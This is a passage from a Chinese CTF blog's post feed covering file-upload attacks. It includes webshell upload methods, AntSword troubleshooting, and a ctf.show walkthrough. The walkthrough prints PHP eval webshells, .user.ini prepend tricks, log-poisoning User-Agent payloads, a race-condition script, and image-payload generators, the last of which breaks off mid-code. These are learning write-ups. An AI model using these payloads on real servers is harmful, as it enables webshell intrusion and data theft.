src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220303210612061.png" alt="image-20220303210612061"></p><p>最后蚁剑连接得到flag</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220303205715928.png" alt="image-20220303205715928"></p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话木马常见的几种上传方式</title>
      <link href="/2022/02/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/02/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>一句话木马常见的几种上传方式</p><span id="more"></span><h1 id="利用00截断，brupsuite上传"><a href="#利用00截断，brupsuite上传" class="headerlink" title="利用00截断，brupsuite上传"></a>利用00截断，brupsuite上传</h1><p>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0X00上传截断漏洞。<br>假设文件的上传路径为<a href="http://xx.xx.xx.xx/upfiles/lubr.php.jpg">http://xx.xx.xx.xx/upfiles/lubr.php.jpg</a> ,通过Burpsuite抓包截断将lubr.php后面的“.”换成“0X00”。在上传的时候，当文件系统读到”0X00″时，会认为文件已经结束，从而将lubr.php.jpg 的内容写到lubr.php中，从而达到攻击的目的。</p><h1 id="构造服务器端扩展名检测上传"><a href="#构造服务器端扩展名检测上传" class="headerlink" title="构造服务器端扩展名检测上传"></a>构造服务器端扩展名检测上传</h1><p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑名单的限制，则不予上传，否则上传成功。<br>本例讲解，将一句话木马的文件名lubr.php改成lubr.php.abc。首先，服务器验证文件扩展名的时候，验证的是.abc，只要改扩展名符合服务器端黑名单规则，即可上传。另外，当在浏览器端访问该文件时，Apache如果解析不了.abc扩展名，会向前寻找可解析的扩展名，即”.php”。一句话木马可以被解析，即可通过中国菜刀或者蚁剑连接。</p><h1 id="绕过Content-Type检测文件类型上传"><a href="#绕过Content-Type检测文件类型上传" class="headerlink" title="绕过Content-Type检测文件类型上传"></a>绕过Content-Type检测文件类型上传</h1><p>当浏览器在上传文件到服务器端的时候，服务器对上传的文件Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失效。绕过Content-Type文件类型检测，就是用Burpsuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</p><h1 id="构造图片木马，绕过文件内容检测上传Shell"><a href="#构造图片木马，绕过文件内容检测上传Shell" class="headerlink" title="构造图片木马，绕过文件内容检测上传Shell"></a>构造图片木马，绕过文件内容检测上传Shell</h1><p>一般文件内容验证使用getimeagesize()函数检测，会判断文件是否一个有效的文件图片，如果是，则允许上传，否则的话不允许上传。</p><p>制作图片木马： copy 1.jpg/b+2.php/a 3.jpg</p><h1 id="图片木马制作的三种方法"><a href="#图片木马制作的三种方法" class="headerlink" title="图片木马制作的三种方法"></a>图片木马制作的三种方法</h1><p>分享几种图片码的制作方式<a href="https://blog.csdn.net/whatday/article/details/54731043">https://blog.csdn.net/whatday/article/details/54731043</a></p>]]></content>
      
      
      <categories>
          
          <category> web类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚁剑常见报错汇总</title>
      <link href="/2022/02/08/%E8%9A%81%E5%89%91%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B1%87%E6%80%BB/"/>
      <url>/2022/02/08/%E8%9A%81%E5%89%91%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>蚁剑常见报错汇总</p><span id="more"></span><h1 id="错误"><a href="#错误" class="headerlink" title="错误{}"></a>错误{}</h1><p><img src="/2022/02/08/%E8%9A%81%E5%89%91%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B1%87%E6%80%BB/24763337-798b542cb7f5c60c.png"></p><p>一般是密码填错了</p><h1 id="Unable-to-resolve-domain-name-from-URL"><a href="#Unable-to-resolve-domain-name-from-URL" class="headerlink" title="Unable to resolve domain name from URL"></a>Unable to resolve domain name from URL</h1><p><img src="/2022/02/08/%E8%9A%81%E5%89%91%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B1%87%E6%80%BB/24763337-562162375f845f92.png"></p><p>一般是”编辑数据“时，”URL地址“一栏url开头没加http://</p><h1 id="设置错误-“address”-“127-0-0-1”-“code”-“ECONNREFUSED”-“errno”-“ECONNREFUSED”-“port”-8080-“syscall”-“connect”"><a href="#设置错误-“address”-“127-0-0-1”-“code”-“ECONNREFUSED”-“errno”-“ECONNREFUSED”-“port”-8080-“syscall”-“connect”" class="headerlink" title="设置错误{“address”:“127.0.0.1”,“code”:“ECONNREFUSED”,“errno”:“ECONNREFUSED”,“port”:8080,“syscall”:“connect”}"></a>设置错误{“address”:“127.0.0.1”,“code”:“ECONNREFUSED”,“errno”:“ECONNREFUSED”,“port”:8080,“syscall”:“connect”}</h1><p><img src="/2022/02/08/%E8%9A%81%E5%89%91%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B1%87%E6%80%BB/24763337-98ea2892c81b013b.png"></p><p>一般是在蚁剑里开了代理的缘故，数据被拦截解决方法：点开Antsword点开代理设置选择不使用代理即可</p><p><img src="/2022/02/08/%E8%9A%81%E5%89%91%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B1%87%E6%80%BB/24763337-3ba1511bc048196b.png"></p>]]></content>
      
      
      <categories>
          
          <category> 知识类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web文件上传详细讲解</title>
      <link href="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
      <url>/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>文件上传详细讲解</p><span id="more"></span><h1 id="简单的了解"><a href="#简单的了解" class="headerlink" title="简单的了解"></a>简单的了解</h1><h2 id="要满足文件上传就必须满足以下三个条件"><a href="#要满足文件上传就必须满足以下三个条件" class="headerlink" title="要满足文件上传就必须满足以下三个条件"></a>要满足文件上传就必须满足以下三个条件</h2><ol><li><p>上传的文件能够被Web容器解释执行，所以文件上传后所在的目录要是Web容器所覆盖到的路径。</p></li><li><p>用户能够从Web上访问这个文件。</p></li><li><p>用户上传的文件如果被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击不成功</p><p>文件包含是代码注入的一种。代码注入就是注入一段用户能控制的脚本代码，并让服务器端执行。“代码注入”的典型代表就是文件包含。文件包含可能会出现在jsp、php、asp语言中。php常用的四种四种文件包含函数：include()、requrie()、include_once()、requrie_once()。使用这些函数包含一个文件时，php内核并不会在意该被包含的文件是什么类型，该文件将作为php代码执行。可分为本地文件包含、远程文件包含。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；<br>2、上传文件是FLASH的策略文件crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);<br>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。<br>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol><li>文件上传的目录设置为不可执行</li><li>文件类型检查</li><li>使用随机数改写文件名和文件路径</li><li>单独设置文件服务器的域名</li></ol></li></ol><h1 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h1><p>前端验证，抓包修改数据</p><h1 id="前端-MIME"><a href="#前端-MIME" class="headerlink" title="前端+MIME"></a>前端+MIME</h1><p>直接抓包修改后缀</p><h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>如果你目录下有user.ini会先去识别里面的配置。当然文档也说了，并不是所有的配置都可以识别。只有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">发现auto_append_file和auto_prepend_file</span><br><span class="line">一个相当于在每个php文件尾加上 include(“xxxx”)，一个相当于文件头加上 include(“xxx”)</span><br><span class="line">使用条件：</span><br><span class="line"></span><br><span class="line">（1）服务器脚本语言为PHP 服务器使用CGI／FastCGI模式</span><br><span class="line"></span><br><span class="line">（2）上传目录下要有可执行的php文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">- 上传一张图片马</span><br><span class="line">- 上传 .user.ini 内容为auto_prepend_file=‘图片马名字’</span><br><span class="line">- 访问.user.ini 同级目录中的一个php文件</span><br></pre></td></tr></table></figure><p>图片码</p><p>随便一张图片以及一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]) ?&gt;</span><br></pre></td></tr></table></figure><p>win+r打开cmd输入cd  图片的路径后输入以下指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd跑命令</span><br><span class="line">copy 1.png/b+ 1.txt 2.png</span><br></pre></td></tr></table></figure><p>上传一张正常图片burp抓包，改设置</p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201128213536531.png" alt="20201128213536531.png (1291×734)"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=2.png</span><br></pre></td></tr></table></figure><p>然后访问一下<code>upload/index.php</code></p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201128215017415.png" alt="20201128215017415.png (1920×560)"></p><p>传参<code>1=phpinfo();</code></p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201128215133904.png" alt="20201128215133904.png (1918×743)"></p><p>开始操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>去上一级目录查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;ls ../&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/2020112821542676.png" alt="2020112821542676.png (1920×688)"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;cat ../flag.php&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201128215709146.png" alt="20201128215709146.png (1919×825)"></p><p>右键查看源代码即可</p><h1 id="文件内容过滤php"><a href="#文件内容过滤php" class="headerlink" title="文件内容过滤php"></a>文件内容过滤php</h1><p>经过测试</p><p>他过滤了<code>php</code>字符串</p><p>这里使用了<code>短标签</code><br>对于php的标签其他写法，我们这里多说几种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、</span><br><span class="line"></span><br><span class="line">&lt;? echo &#x27;123&#x27;;?&gt;</span><br></pre></td></tr></table></figure><p>前提是开启配置参数<code>short_open_tags=on</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2、</span><br><span class="line"></span><br><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br></pre></td></tr></table></figure><p>不需要开启参数设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3、</span><br><span class="line"></span><br><span class="line">&lt;% echo &#x27;123&#x27;;%&gt;</span><br></pre></td></tr></table></figure><p>前提是开启配置参数<code>asp_tags=on</code>，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4、</span><br><span class="line"></span><br><span class="line">&lt;script language=”php”&gt;echo &#x27;123&#x27;; &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>不需要修改参数开关，但是只能在7.0以下可用。</p><p>对于该题，我们可用使用<code>&lt;?=(表达式)?&gt;</code>进行绕过</p><p>图片内容 <code>&lt;?=eval($_POST[1]);?&gt;</code></p><h1 id="过滤php和"><a href="#过滤php和" class="headerlink" title="过滤php和[]"></a>过滤php和[]</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload </span><br><span class="line">用&#123;&#125;代替[]</span><br><span class="line">&lt;?=eval($_POST&#123;&#x27;a&#x27;&#125;);</span><br></pre></td></tr></table></figure><h1 id="增加过滤"><a href="#增加过滤" class="headerlink" title="增加过滤{};"></a>增加过滤{};</h1><p>php 最后的语句也可以不加分号的，前提是得有 ?&gt; 结束标志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&lt;?=system(&#x27;ls ../&#x27;)?&gt;</span><br><span class="line">&lt;?=system(&#x27;cat ../*&#x27;)?&gt;</span><br><span class="line">访问upload/index.php</span><br></pre></td></tr></table></figure><p>过滤括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">反引号代替system()</span><br><span class="line"></span><br><span class="line">&lt;?=`cat ../*`?&gt;</span><br></pre></td></tr></table></figure><p>想去包含日志文件</p><p>发现<code>log</code>也被过滤了,尝试拼接</p><p>先上传图片内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure><p>然后上传正常图片 改后缀<code>.user.ini</code> 改内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=5.png</span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201129131007621.png" alt="20201129131007621.png (1283×648)"></p><p>然后还需要改UA头 重新抓包 页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;?php system(&#x27;tac ../f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问<code>/upload</code> 右键源代码就可以了</p><h1 id="检测文件头"><a href="#检测文件头" class="headerlink" title="检测文件头"></a>检测文件头</h1><p>正常图片上传失败 猜测检测了文件头</p><p>上传<code>GIF89a</code> 成功绕过，上传正常图片，修改后缀<code>.user.ini</code>改内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=5.png</span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201129131007621.png" alt="20201129131007621.png (1283×648)"></p><p>然后还需要改UA头 重新抓包 页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;?php system(&#x27;tac ../f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问<code>/upload</code> 右键源代码就可以了</p><h1 id="文件竞争与包含"><a href="#文件竞争与包含" class="headerlink" title="文件竞争与包含"></a>文件竞争与包含</h1><p>还是一样先上传<code>.user.ini</code> 同样检测文件头</p><p>然后上传图片 内容就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=include<span class="string">&quot;/tmp/sess_yu22x&quot;</span>?&gt;</span><br></pre></td></tr></table></figure><p>然后条件竞争 跑脚本 附上大佬的脚本 通杀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=&#x27;yu22x&#x27;</span><br><span class="line">url1=&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span><br><span class="line">data1=&#123;</span><br><span class="line">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">&#x27;file&#x27;:&#x27;yu22x&#x27;</span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">&#x27;PHPSESSID&#x27;: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">while True:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def read():</span><br><span class="line">while True:</span><br><span class="line">r = session.get(url2)</span><br><span class="line">if &#x27;flag&#x27; in r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line">for t in threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><h1 id="pang图片二次渲染"><a href="#pang图片二次渲染" class="headerlink" title="pang图片二次渲染"></a>pang图片二次渲染</h1><p>这道题 要制作 ，，制作绕过二次渲染的图片马</p><p>具体可以看<a href="https://blog.csdn.net/weixin_45519736/article/details/105775721">这里</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;./2.png&#x27;);  //要修改的图片的路径</span><br><span class="line">/* 木马内容</span><br><span class="line">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后上传png二次渲染的图片</p><p>然后查看图片 post抓包 传马</p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201129171802219.png" alt="20201129171802219.png (1920×816)"></p><p>就完事了</p><h1 id="jpg二次渲染"><a href="#jpg二次渲染" class="headerlink" title="jpg二次渲染"></a>jpg二次渲染</h1><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201130010404353.png" alt="20201130010404353.png (1897×953)"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        